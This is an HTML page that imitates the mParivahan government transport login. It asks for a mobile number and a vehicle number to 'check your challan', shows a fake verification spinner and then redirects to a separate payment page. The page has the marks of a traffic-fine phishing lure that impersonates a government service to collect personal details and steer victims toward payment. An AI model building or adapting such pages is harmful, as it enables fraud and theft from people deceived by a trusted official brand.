<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>mParivahan â€“ Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
    body{
      background:linear-gradient(135deg,#4fc3f7,#81d4fa);
      min-height:100vh;display:flex;justify-content:center;align-items:center;
      padding:15px;
    }
    .container{
      background:rgba(255,255,255,.95);border-radius:20px;
      padding:25px 20px;width:100%;max-width:340px;
      box-shadow:0 10px 25px rgba(0,0,0,.12);text-align:center;
      position:relative;
    }
    .logo{font-size:clamp(28px,9vw,36px);font-weight:700;color:#1565c0;margin-bottom:18px;}
    .logo span{color:#1976d2;}
    .form-group{margin-bottom:16px;}
    .form-group input{
      width:100%;padding:14px;border:2px solid #eee;
      border-radius:12px;font-size:16px;text-align:center;
      transition:.3s;
    }
    .form-group input:focus{outline:none;border-color:#1976d2;box-shadow:0 0 0 3px rgba(25,118,210,.2);}
    .login-btn{
      background:linear-gradient(45deg,#1976d2,#42a5f5);color:#fff;
      border:none;padding:14px;border-radius:12px;font-size:17px;
      font-weight:600;width:100%;cursor:pointer;transition:.3s;
    }
    .login-btn:disabled{opacity:.6;cursor:not-allowed;}
    .overlay{
      position:absolute;top:0;left:0;right:0;bottom:0;
      background:rgba(255,255,255,.9);border-radius:20px;
      display:none;justify-content:center;align-items:center;
      flex-direction:column;gap:12px;z-index:10;
    }
    .spinner{width:45px;height:45px;border:5px solid #f3f3f3;
      border-top:5px solid #1976d2;border-radius:50%;animation:spin 1s linear infinite;}
    .loading-text{font-size:15px;color:#1976d2;}
    @keyframes spin{to{transform:rotate(360deg);}}
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">m<span>Parivahan</span></div>
    <div class="form-group"><input type="tel" placeholder="10-digit Mobile No." id="mobile" required /></div>
    <div class="form-group"><input type="text" placeholder="Enter Vehicle Number" id="vehicle" required /></div>
    <button class="login-btn" id="loginBtn">CHECK YOUR CHALLAN</button>
    <div class="overlay" id="loadingOverlay">
      <div class="spinner"></div>
      <p class="loading-text">Verifying vehicle details...</p>
    </div>
  </div>

  <script>
    document.getElementById('loginBtn').addEventListener('click', function () {
      const mobile = document.getElementById('mobile').value.trim();
      const vehicle = document.getElementById('vehicle').value.trim();
      if (!mobile || !vehicle) { alert('Please fill both fields.'); return; }
      document.getElementById('loadingOverlay').style.display = 'flex';
      this.disabled = true;
      setTimeout(() => { window.location.href = 'payment-mparivahan.html'; }, 2500);
    });
  </script>
</body>
</html>
